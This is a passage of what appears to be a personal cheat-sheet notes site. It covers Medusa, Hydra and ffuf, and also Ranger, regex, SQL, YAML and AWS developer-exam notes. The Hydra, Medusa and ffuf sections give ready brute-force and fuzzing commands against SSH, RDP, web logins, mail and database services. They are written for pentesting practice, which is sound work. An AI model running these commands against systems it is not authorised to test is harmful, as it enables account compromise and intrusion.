<pre><code class="language-bash">medusa -h 192.168.1.100 -n 2222 -U usernames.txt -P passwords.txt -M ssh
</code></pre>
<h3 id="verbose-output"><a class="header" href="#verbose-output">Verbose Output</a></h3>
<pre><code class="language-bash">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -v 4
</code></pre>
<h3 id="parallel-tasks"><a class="header" href="#parallel-tasks">Parallel Tasks</a></h3>
<pre><code class="language-bash">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -t 8
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hydra-cheatsheet"><a class="header" href="#hydra-cheatsheet">Hydra Cheatsheet</a></h1>
<h2 id="basic-syntax"><a class="header" href="#basic-syntax">Basic Syntax</a></h2>
<pre><code>hydra [login_options] [password_options] [attack_options] [service_options] service://server
</code></pre>
<hr>
<h2 id="login-options"><a class="header" href="#login-options">Login Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-l LOGIN</code></td><td>Single username</td><td><code>hydra -l admin ...</code></td></tr>
<tr><td><code>-L FILE</code></td><td>Username list file</td><td><code>hydra -L usernames.txt ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="password-options"><a class="header" href="#password-options">Password Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-p PASS</code></td><td>Single password</td><td><code>hydra -p password123 ...</code></td></tr>
<tr><td><code>-P FILE</code></td><td>Password list file</td><td><code>hydra -P passwords.txt ...</code></td></tr>
<tr><td><code>-x MIN:MAX:CHARSET</code></td><td>Generate passwords</td><td><code>hydra -x 6:8:aA1 ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="attack-options"><a class="header" href="#attack-options">Attack Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-t TASKS</code></td><td>Number of parallel tasks (threads)</td><td><code>hydra -t 4 ...</code></td></tr>
<tr><td><code>-f</code></td><td>Stop after first successful login</td><td><code>hydra -f ...</code></td></tr>
<tr><td><code>-s PORT</code></td><td>Specify non-default port</td><td><code>hydra -s 2222 ...</code></td></tr>
<tr><td><code>-v</code></td><td>Verbose output</td><td><code>hydra -v ...</code></td></tr>
<tr><td><code>-V</code></td><td>Very verbose output</td><td><code>hydra -V ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="common-services"><a class="header" href="#common-services">Common Services</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Service</th><th>Protocol</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>ftp</code></td><td>FTP</td><td>File Transfer Protocol</td><td><code>hydra -l admin -P passwords.txt ftp://192.168.1.100</code></td></tr>
<tr><td><code>ssh</code></td><td>SSH</td><td>Secure Shell</td><td><code>hydra -l root -P passwords.txt ssh://192.168.1.100</code></td></tr>
<tr><td><code>http-get</code></td><td>HTTP GET</td><td>Web login (GET)</td><td><code>hydra -l admin -P passwords.txt http-get://example.com/login</code></td></tr>
<tr><td><code>http-post</code></td><td>HTTP POST</td><td>Web login (POST)</td><td><code>hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect"</code></td></tr>
<tr><td><code>smtp</code></td><td>SMTP</td><td>Email sending</td><td><code>hydra -l admin -P passwords.txt smtp://mail.server.com</code></td></tr>
<tr><td><code>pop3</code></td><td>POP3</td><td>Email retrieval</td><td><code>hydra -l user@example.com -P passwords.txt pop3://mail.server.com</code></td></tr>
<tr><td><code>imap</code></td><td>IMAP</td><td>Remote email access</td><td><code>hydra -l user@example.com -P passwords.txt imap://mail.server.com</code></td></tr>
<tr><td><code>rdp</code></td><td>RDP</td><td>Remote Desktop Protocol</td><td><code>hydra -l administrator -P passwords.txt rdp://192.168.1.100</code></td></tr>
<tr><td><code>telnet</code></td><td>Telnet</td><td>Remote terminal</td><td><code>hydra -l admin -P passwords.txt telnet://192.168.1.100</code></td></tr>
<tr><td><code>mysql</code></td><td>MySQL</td><td>Database</td><td><code>hydra -l root -P passwords.txt mysql://192.168.1.100</code></td></tr>
<tr><td><code>postgres</code></td><td>PostgreSQL</td><td>Database</td><td><code>hydra -l postgres -P passwords.txt postgres://192.168.1.100</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="useful-examples-2"><a class="header" href="#useful-examples-2">Useful Examples</a></h2>
<h3 id="ssh-brute-force"><a class="header" href="#ssh-brute-force">SSH Brute Force</a></h3>
<pre><code>hydra -l root -P /path/to/passwords.txt -t 4 ssh://192.168.1.100
</code></pre>
<h3 id="ftp-brute-force"><a class="header" href="#ftp-brute-force">FTP Brute Force</a></h3>
<pre><code>hydra -L usernames.txt -P passwords.txt ftp://192.168.1.100
</code></pre>
<h3 id="http-post-form-attack-1"><a class="header" href="#http-post-form-attack-1">HTTP POST Form Attack</a></h3>
<pre><code>hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect" 192.168.1.100
</code></pre>
<h3 id="rdp-with-password-generation"><a class="header" href="#rdp-with-password-generation">RDP with Password Generation</a></h3>
<pre><code>hydra -l administrator -x 6:8:aA1 rdp://192.168.1.100
</code></pre>
<h3 id="ssh-on-non-default-port"><a class="header" href="#ssh-on-non-default-port">SSH on Non-Default Port</a></h3>
<pre><code>hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100
</code></pre>
<h3 id="stop-after-first-success"><a class="header" href="#stop-after-first-success">Stop After First Success</a></h3>
<pre><code>hydra -l admin -P passwords.txt -f ssh://192.168.1.100
</code></pre>
<h3 id="verbose-output-1"><a class="header" href="#verbose-output-1">Verbose Output</a></h3>
<pre><code>hydra -l admin -P passwords.txt -v ssh://192.168.1.100
</code></pre>
<h3 id="rdp-with-custom-character-set"><a class="header" href="#rdp-with-custom-character-set">RDP with Custom Character Set</a></h3>
<pre><code>hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 rdp://192.168.1.100
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ranger-cheatsheet"><a class="header" href="#ranger-cheatsheet">Ranger Cheatsheet</a></h1>
<h2 id="general"><a class="header" href="#general">General</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>ranger</code></td><td>Start Ranger</td></tr>
<tr><td><code>Q</code></td><td>Quit Ranger</td></tr>
<tr><td><code>R</code></td><td>Reload current directory</td></tr>
<tr><td><code>?</code></td><td>Ranger Manpages / Shortcuts</td></tr>
</tbody>
</table>
</div>
<h2 id="movement"><a class="header" href="#movement">Movement</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>k</code></td><td>up</td></tr>
<tr><td><code>j</code></td><td>down</td></tr>
<tr><td><code>h</code></td><td>parent directory</td></tr>
<tr><td><code>l</code></td><td>subdirectory</td></tr>
<tr><td><code>gg</code></td><td>go to top of list</td></tr>
<tr><td><code>G</code></td><td>go t bottom of list</td></tr>
<tr><td><code>J</code></td><td>half page down</td></tr>
<tr><td><code>K</code></td><td>half page up</td></tr>
<tr><td><code>H</code></td><td>History Back</td></tr>
<tr><td><code>L</code></td><td>History Forward</td></tr>
<tr><td><code>~</code></td><td>Switch the view</td></tr>
</tbody>
</table>
</div>
<h2 id="file-operations"><a class="header" href="#file-operations">File Operations</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>&lt;Enter&gt;</code></td><td>Open</td></tr>
<tr><td><code>r</code></td><td>open file with</td></tr>
<tr><td><code>z</code></td><td>toggle settings</td></tr>
<tr><td><code>o</code></td><td>change sort order</td></tr>
<tr><td><code>zh</code></td><td>view hidden files</td></tr>
<tr><td><code>cw</code></td><td>rename current file</td></tr>
<tr><td><code>yy</code></td><td>yank / copy</td></tr>
<tr><td><code>dd</code></td><td>cut</td></tr>
<tr><td><code>pp</code></td><td>paste</td></tr>
<tr><td><code>/</code></td><td>search for files <code>:search</code></td></tr>
<tr><td><code>n</code></td><td>next match</td></tr>
<tr><td><code>N</code></td><td>prev match</td></tr>
<tr><td><code>&lt;delete&gt;</code></td><td>Delete</td></tr>
</tbody>
</table>
</div>
<h2 id="commands"><a class="header" href="#commands">Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>:</code></td><td>Execute Range Command</td></tr>
<tr><td><code>!</code></td><td>Execute Shell Command</td></tr>
<tr><td><code>chmod</code></td><td>Change file Permissions</td></tr>
<tr><td><code>du</code></td><td>Disk Usage Current Directory</td></tr>
<tr><td><code>S</code></td><td>Run the terminal in your current ranger window (exit to go back to ranger)</td></tr>
</tbody>
</table>
</div>
<h2 id="tabs"><a class="header" href="#tabs">Tabs</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>C-n</code></td><td>Create new tab</td></tr>
<tr><td><code>C-w</code></td><td>Close current tab</td></tr>
<tr><td>tab</td><td>Next tab</td></tr>
<tr><td>shift + tab</td><td>Previous tab</td></tr>
<tr><td>alt + [n]</td><td>goto / create [n] tab</td></tr>
</tbody>
</table>
</div>
<h2 id="file-substituting"><a class="header" href="#file-substituting">File substituting</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>%f</code></td><td>Substitute highlighted file</td></tr>
<tr><td><code>%d</code></td><td>Substitute current directory</td></tr>
<tr><td><code>%s</code></td><td>Substitute currently selected files</td></tr>
<tr><td><code>%t</code></td><td>Substitute currently tagged files</td></tr>
</tbody>
</table>
</div>
<h3 id="example-for-substitution"><a class="header" href="#example-for-substitution">Example for substitution</a></h3>
<p><code>:bulkrename %s</code></p>
<h2 id="marker"><a class="header" href="#marker">Marker</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>m  + &lt;letter&gt;</code></td><td>Create Marker</td></tr>
<tr><td><code>um  + &lt;letter&gt;</code></td><td>Delete Marker</td></tr>
<tr><td><code>'  + &lt;letter&gt;</code></td><td>Go to Marker</td></tr>
<tr><td><code>t</code></td><td>tag a file with an *</td></tr>
<tr><td><code>t"&lt;any&gt;</code></td><td>tag a file with your desired mark</td></tr>
</tbody>
</table>
</div>
<p><em>thx to the comments section for additional shortcuts! post your suggestions there!</em></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="regex-cheatsheet"><a class="header" href="#regex-cheatsheet">Regex Cheatsheet</a></h1>
<p>Regular expressions (regex) are patterns used for string matching and manipulation. Here‚Äôs a quick reference guide for common regex syntax:</p>
<h2 id="basics"><a class="header" href="#basics">Basics</a></h2>
<ul>
<li><code>.</code>: Matches any character except a newline.</li>
<li><code>^</code>: Matches the start of a string or line.</li>
<li><code>$</code>: Matches the end of a string or line.</li>
</ul>
<h2 id="character-classes"><a class="header" href="#character-classes">Character Classes</a></h2>
<ul>
<li><code>[abc]</code>: Matches any character <code>a</code>, <code>b</code>, or <code>c</code>.</li>
<li><code>[^abc]</code>: Matches any character except <code>a</code>, <code>b</code>, or <code>c</code>.</li>
<li><code>[a-z]</code>: Matches any lowercase letter.</li>
<li><code>[A-Z]</code>: Matches any uppercase letter.</li>
<li><code>[0-9]</code>: Matches any digit.</li>
<li><code>[a-zA-Z0-9]</code>: Matches any alphanumeric character.</li>
<li><code>\d</code>: Matches any digit (short for <code>[0-9]</code>).</li>
<li><code>\w</code>: Matches any word character (alphanumeric + underscore).</li>
<li><code>\s</code>: Matches any whitespace character (space, tab, newline).</li>
</ul>
<h2 id="quantifiers"><a class="header" href="#quantifiers">Quantifiers</a></h2>
<ul>
<li><code>*</code>: Matches the preceding element zero or more times.</li>
<li><code>+</code>: Matches the preceding element one or more times.</li>
<li><code>?</code>: Matches the preceding element zero or one time.</li>
<li><code>{n}</code>: Matches the preceding element exactly <code>n</code> times.</li>
<li><code>{n,}</code>: Matches the preceding element <code>n</code> or more times.</li>
<li><code>{n,m}</code>: Matches the preceding element between <code>n</code> and <code>m</code> times.</li>
</ul>
<h2 id="groups-and-alternation"><a class="header" href="#groups-and-alternation">Groups and Alternation</a></h2>
<ul>
<li><code>(abc)</code>: Matches the group <code>abc</code> and captures it.</li>
<li><code>(?:abc)</code>: Matches the group <code>abc</code> without capturing it.</li>
<li><code>a|b</code>: Matches either <code>a</code> or <code>b</code>.</li>
</ul>
<h2 id="anchors"><a class="header" href="#anchors">Anchors</a></h2>
<ul>
<li><code>\b</code>: Matches a word boundary.</li>
<li><code>\B</code>: Matches a position that is not a word boundary.</li>
<li><code>(?=...)</code>: Positive lookahead assertion.</li>
<li><code>(?!...)</code>: Negative lookahead assertion.</li>
</ul>
<h2 id="escaping-special-characters"><a class="header" href="#escaping-special-characters">Escaping Special Characters</a></h2>
<ul>
<li><code>\\</code>: Escapes a special character (e.g., <code>\\.</code> matches a literal period).</li>
</ul>
<h2 id="flags-depends-on-language"><a class="header" href="#flags-depends-on-language">Flags (Depends on Language)</a></h2>
<ul>
<li><code>i</code>: Case-insensitive matching.</li>
<li><code>g</code>: Global match (find all occurrences).</li>
<li><code>m</code>: Multiline mode (^ and $ match the start/end of each line).</li>
<li><code>s</code>: Dot matches all, including newlines.</li>
<li><code>u</code>: Treat the pattern and input as UTF-16 or UTF-32.</li>
<li><code>x</code>: Ignore whitespace and allow comments.</li>
</ul>
<h2 id="examples"><a class="header" href="#examples">Examples</a></h2>
<ul>
<li><code>/\d{3}-\d{2}-\d{4}/</code>: Matches a standard US social security number.</li>
<li><code>/^[A-Za-z]+$/</code>: Matches a string containing only letters.</li>
<li><code>/https?:\/\/(www\.)?\w+\.\w+/</code>: Matches URLs starting with <code>http://</code> or <code>https://</code>.</li>
<li><code>/(\d+)\s?-\s?\1/</code>: Matches repeated numbers separated by a hyphen.</li>
<li><code>^(\/[^\/?]+)(\/[^\/?]+)?(\/[^\/?]+)?</code>: Match all text up to the 3rd ‚Äò/‚Äô in a URL</li>
<li><code>^[a-z][a-z0-9+\-.]*://([a-z0-9\-._~%!$&amp;'()*+,;=]+@)?([a-z0-9\-._~%]+|\[[a-z0-9\-._~%!$&amp;'()*+,;=:]+\])</code>: extract hostname from URL</li>
<li><code>^https?:\/\/(.*)(\/[^\/?]+)(\/[^\/?]+)?(\/[^\/?]+)?</code>: Match protocol (http/s), hostname, and path (3 forward slashes)</li>
</ul>
<h2 id="useful-links"><a class="header" href="#useful-links">Useful links</a></h2>
<p>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions/Cheatsheet</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="sql-cheat-sheet"><a class="header" href="#sql-cheat-sheet">SQL Cheat Sheet</a></h1>
<h1 id="who-has-a-role"><a class="header" href="#who-has-a-role">Who has a role:</a></h1>
<pre><code> select @@ServerName [Server Name], DB_NAME() [DB Name], u.name [DB Role], u2.name [Member Name]
    from sys.database_role_members m
    join sys.database_principals u on m.role_principal_id = u.principal_id
    join sys.database_principals u2 on m.member_principal_id = u2.principal_id
    where u.name = 'db_owner'
    order by [Member Name]
</code></pre>
<h1 id="who-logged-in-as-dbo"><a class="header" href="#who-logged-in-as-dbo">Who logged in as dbo:</a></h1>
<pre><code>#in user database run the command 
SELECT name, sid FROM sys.sysusers where name = 'dbo' . 
#in master database run the command 
SELECT name, sid FROM sys.sql_logins
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="multi-line-strings"><a class="header" href="#multi-line-strings">multi-line strings</a></h1>
<p>There are 9 (or 63*, depending how you count) different ways to write multi-line strings in YAML.</p>
<ul>
<li>
<p>Use &gt; most of the time: interior line breaks are stripped out, although you get one at the end:</p>
<pre><code>  key: &gt;
  Your long
  string here.
</code></pre>
</li>
<li>
<p>Use | if you want those linebreaks to be preserved as \n (for instance, embedded markdown with paragraphs):</p>
<pre><code>  key: |
  ### Heading

  * Bullet
  * Points
</code></pre>
</li>
<li>
<p>Use &gt;- or |- instead if you don‚Äôt want a linebreak appended at the end.</p>
</li>
<li>
<p>Use ‚Äú‚Ä¶‚Äù if you need to split lines in the middle of words or want to literally type linebreaks as \n:</p>
<pre><code> key: "Hello\
 World!\n\nGet on it."
</code></pre>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ffuf-cheatsheet"><a class="header" href="#ffuf-cheatsheet">FFuf Cheatsheet</a></h1>
<h2 id="basic-commands"><a class="header" href="#basic-commands">Basic Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>ffuf -h</code></td><td>Show ffuf help</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="fuzzing-types"><a class="header" href="#fuzzing-types">Fuzzing Types</a></h2>
<h3 id="directory-fuzzing"><a class="header" href="#directory-fuzzing">Directory Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
</code></pre>
<h3 id="extension-fuzzing"><a class="header" href="#extension-fuzzing">Extension Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ
</code></pre>
<h3 id="page-fuzzing"><a class="header" href="#page-fuzzing">Page Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
</code></pre>
<h3 id="recursive-fuzzing"><a class="header" href="#recursive-fuzzing">Recursive Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
</code></pre>
<h3 id="sub-domain-fuzzing"><a class="header" href="#sub-domain-fuzzing">Sub-domain Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/
</code></pre>
<h3 id="vhost-fuzzing"><a class="header" href="#vhost-fuzzing">VHost Fuzzing</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx
</code></pre>
<h3 id="parameter-fuzzing---get"><a class="header" href="#parameter-fuzzing---get">Parameter Fuzzing - GET</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
</code></pre>
<h3 id="parameter-fuzzing---post"><a class="header" href="#parameter-fuzzing---post">Parameter Fuzzing - POST</a></h3>
<pre><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
</code></pre>
<h3 id="value-fuzzing"><a class="header" href="#value-fuzzing">Value Fuzzing</a></h3>
<pre><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
</code></pre>
<hr>
<h2 id="wordlists"><a class="header" href="#wordlists">Wordlists</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Type</th><th>Path</th></tr>
</thead>
<tbody>
<tr><td><strong>Directory/Page</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</code></td></tr>
<tr><td><strong>Extensions</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/web-extensions.txt</code></td></tr>
<tr><td><strong>Domain</strong></td><td><code>/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td></tr>
<tr><td><strong>Parameters</strong></td><td><code>/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="misc"><a class="header" href="#misc">Misc</a></h2>
<h3 id="add-dns-entry"><a class="header" href="#add-dns-entry">Add DNS Entry</a></h3>
<pre><code>sudo sh -c 'echo "SERVER_IP academy.htb" &gt;&gt; /etc/hosts'
</code></pre>
<h3 id="create-sequence-wordlist"><a class="header" href="#create-sequence-wordlist">Create Sequence Wordlist</a></h3>
<pre><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done
</code></pre>
<h3 id="curl-with-post"><a class="header" href="#curl-with-post">curl with POST</a></h3>
<pre><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hashcat"><a href="#hashcat" class="header">hashcat</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="clouds"><a class="header" href="#clouds">Clouds</a></h1>
<p>Notes related to various cloud service providers.</p>
<h2 id="directory-map-1"><a class="header" href="#directory-map-1">Directory Map</a></h2>
<ul>
<li><a href="clouds/aws">aws</a></li>
<li><a href="clouds/azure">azure</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aws"><a class="header" href="#aws">AWS</a></h1>
<p>Notes related to Amazon Web Services (AWS).</p>
<ul>
<li><a href="clouds/aws/dva-c02/README.html">AWS Certified Developer</a>: Notes for the AWS Certified Developer - Associate (DVA-C02) exam.</li>
<li><a href="clouds/aws/saa-c03/README.html">Solutions Architect - Associate</a>: Notes for the AWS Certified Solutions Architect - Associate (SAA-C03) exam.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dva-c02-notes"><a class="header" href="#dva-c02-notes">DVA-C02-notes</a></h1>
<h2 id="directory-map-2"><a class="header" href="#directory-map-2">Directory Map</a></h2>
<ul>
<li><a href="#elastic-beanstalk">beanstalk</a></li>
<li><a href="#cloudformation">cloudformation</a></li>
<li><a href="#cloudfront">cloudfront</a></li>
<li><a href="clouds/aws/dva-c02/containers">containers</a>
<ul>
<li><a href="#copilot">copilot</a></li>
<li><a href="#elastic-container-registry">ecr</a></li>
<li><a href="#elastic-container-service">ecs</a></li>
</ul>
</li>
<li><a href="#dynamodb">dynamodb</a></li>
<li><a href="#ec2">ec2</a></li>
<li><a href="#elasticache">elasticache</a></li>
<li><a href="#iam">iam</a></li>
<li><a href="#kinesis">kinesis</a></li>
<li><a href="#lambda">lambda</a></li>
<li><a href="clouds/aws/dva-c02/monitoring">monitoring</a>
<ul>
<li><a href="#cloudtrail">cloudtrail</a></li>
<li><a href="#cloudwatch">cloudwatch</a></li>
<li><a href="#x-ray">x-ray</a></li>
</ul>
</li>
<li><a href="clouds/aws/dva-c02/rds">rds</a>
<ul>
<li><a href="#aurora">aurora</a></li>
<li><a href="#rds-relational-database-service">rds</a></li>
</ul>
</li>
<li><a href="#route53">route53</a></li>
<li><a href="#s3">s3</a></li>
<li><a href="#simple-notification-system">sns</a></li>
<li><a href="#simple-queue-system">sqs</a></li>
<li><a href="#vpc">vpc</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elastic-beanstalk"><a class="header" href="#elastic-beanstalk">Elastic Beanstalk</a></h1>
<h2 id="introduction"><a class="header" href="#introduction">Introduction</a></h2>
<ul>
<li>Developer centric view of deploying an application on AWS</li>
<li>Simplifies deploying EC2, ASG, ELB, RDS, etc.</li>
<li>Fully managed by AWS</li>
</ul>
<h2 id="beanstalk-components"><a class="header" href="#beanstalk-components">Beanstalk Components</a></h2>
<ul>
<li>Application: A collection of Beanstalk components</li>
<li>Application Version: an iteration of your application</li>
<li>Environment:
<ul>
<li>collection of AWS resources running an application version</li>
<li>Tiers: web server environment and worker environment</li>
<li>You can create multiple environments (dev, prod, QA, etc.)</li>
</ul>
</li>
</ul>
<h2 id="supported-platforms"><a class="header" href="#supported-platforms">Supported Platforms</a></h2>
<ul>
<li>Multiple languages supported: Go, Python, Java, .NET, Node, PHP, Ruby, Packer Builder,</li>
<li>Supports single container docker, multi-container docker, etc.</li>
</ul>
<h2 id="deployment-modes"><a class="header" href="#deployment-modes">Deployment Modes</a></h2>
<ul>
<li>Single Instance
<ul>
<li>One EC2 instance</li>
<li>Great for dev environments</li>
</ul>
</li>
<li>HA with Load Balancer
<ul>
<li>Multiple EC2 instances in ASG</li>
<li>Great for prod</li>
</ul>
</li>
</ul>
<h2 id="deployment-options"><a class="header" href="#deployment-options">Deployment Options</a></h2>
<ul>
<li>All at once
<ul>
<li>fastest, but instances aren‚Äôt available to service traffic for a bit (downtime)</li>
</ul>
</li>
<li>Rolling
<ul>
<li>A few instances at a time are taken offline and updated</li>
</ul>
</li>
<li>Rolling with additional batches
<ul>
<li>Like rolling, but spins up new instances to move the batch</li>
</ul>
</li>
<li>Immutable
<ul>
<li>Spins up new instances in a new ASG, deploys versions to these instances, and then swaps all the instances when the new are healthy</li>
</ul>
</li>
<li>Blue/Green
<ul>
<li>Create a new environment and switch over when ready</li>
</ul>
</li>
<li>Traffic Splitting
<ul>
<li>Like canary testing</li>
</ul>
</li>
</ul>
<img src="clouds/aws/dva-c02/images/beanstalk-deployment-methods.png.png" width="77%" height="40%" />
<h2 id="beanstalk-lifecycle-policy"><a class="header" href="#beanstalk-lifecycle-policy">Beanstalk Lifecycle Policy</a></h2>
<ul>
<li>Beanstalk can store at most 1000 application versions</li>
<li>Versions currently in use cannot be deleted</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudformation"><a class="header" href="#cloudformation">CloudFormation</a></h1>
<h2 id="introduction-1"><a class="header" href="#introduction-1">Introduction</a></h2>
<ul>
<li>Declarative language for deploying resources in AWS</li>
<li>YAML or JSON</li>
<li>CloudFormation templates can be visualized using Application Composer</li>
</ul>
<h2 id="example-1"><a class="header" href="#example-1">Example</a></h2>
<pre><code>---
Resources:
  MyInstance:
    Type: AWS::EC2::Instance
    Properties:
      AvailabilityZone: us-east-1a
      ImageId: ami-0a3c3a20c09d6f377
      InstanceType: t2.micro
</code></pre>
<h2 id="cloudformation-template-sections"><a class="header" href="#cloudformation-template-sections">CloudFormation Template Sections</a></h2>
<ul>
<li>
<p>Resources</p>
<ul>
<li>The only required section in a template</li>
<li>The resources section represent the AWS components that the CF template will deploy</li>
<li>Resource type identifiers are in this format:
<ul>
<li>service-provider::service-name::data-type-name</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Parameters</p>
<ul>
<li>Provide input to your CF templates</li>
</ul>
</li>
<li>
<p>Mappings</p>
<ul>
<li>
<p>Fixed variables in your CF template used to differentiate between different environment like dev vs prod, regions, AMI types, etc.</p>
</li>
<li>
<p>To access values in a map, use <code>Fn::FindInMap</code>:</p>
<pre><code>    {
      ...
      "Mappings" : {
        "RegionMap" : {
          "us-east-1" : {
            "HVM64" : "ami-0ff8a91507f77f867", "HVMG2" : "ami-0a584ac55a7631c0c"
          },
          "us-west-1" : {
            "HVM64" : "ami-0bdb828fd58c52235", "HVMG2" : "ami-066ee5fd4a9ef77f1"
          },
          "eu-west-1" : {
            "HVM64" : "ami-047bb4163c506cd98", "HVMG2" : "ami-0a7c483d527806435"
          },
          "ap-southeast-1" : {
            "HVM64" : "ami-08569b978cc4dfa10", "HVMG2" : "ami-0be9df32ae9f92309"
          },
          "ap-northeast-1" : {
            "HVM64" : "ami-06cd52961ce9f0d85", "HVMG2" : "ami-053cdd503598e4a9d"
          }
        }
      },

      "Resources" : {
        "myEC2Instance" : {
          "Type" : "AWS::EC2::Instance",
          "Properties" : {
            "ImageId" : {
              "Fn::FindInMap" : [
                "RegionMap",
                {
                  "Ref" : "AWS::Region"
                },
                "HVM64"
              ]
            },
            "InstanceType" : "m1.small"
          }
        }
      }
    }
</code></pre>
</li>
</ul>
</li>
<li>
<p>Outputs</p>
<ul>
<li>Optional</li>
<li>Output values can be referenced in other stacks</li>
<li>Use <code>FN:ImportValue</code></li>
</ul>
</li>
<li>
<p>Conditions</p>
<ul>
<li>Control the creation of resources or outputs based on a condition</li>
</ul>
</li>
</ul>
<h2 id="intrinsic-functions"><a class="header" href="#intrinsic-functions">Intrinsic Functions</a></h2>
<ul>
<li>Fn::Ref - Get a references to a value of a paremeter, physical Id of a resource, etc.</li>
<li>Fn::GetAtt - Get attributes from a resource</li>
<li>Fn::FindInMap - Retrieve a value from a map</li>
<li>Fn::ImportValue - Import an output value from another template</li>
<li>Fn::Base64 - Convert a value to Base64 inside a template</li>
<li>Condition Functions (Fn::If, Fn::Not, Fn::Equals, etc.)</li>
<li>etc‚Ä¶.</li>
</ul>
<h2 id="service-roles"><a class="header" href="#service-roles">Service Roles</a></h2>
<ul>
<li>IAM roles that allow CloudFormation to create/update/delete stack resources</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudfront"><a class="header" href="#cloudfront">CloudFront</a></h1>
<h2 id="table-of-contents"><a class="header" href="#table-of-contents">Table of Contents</a></h2>
<ul>
<li><a href="#introduction-3">Introduction</a></li>
<li><a href="#cloudfront-core-components-1">CloudFront Core Components</a></li>
<li><a href="#cloudfront-distributions-1">CloudFront Distributions</a></li>
<li><a href="#lambdaedge-1">Lambda@Edge</a></li>
<li><a href="#cloudfront-protection-1">CloudFront Protection</a></li>
<li><a href="#caching-policy-1">Caching Policy</a></li>
<li><a href="#caching-behaviors-1">Caching Behaviors</a></li>
<li><a href="#geo-restriction-1">Geo-Restriction</a></li>
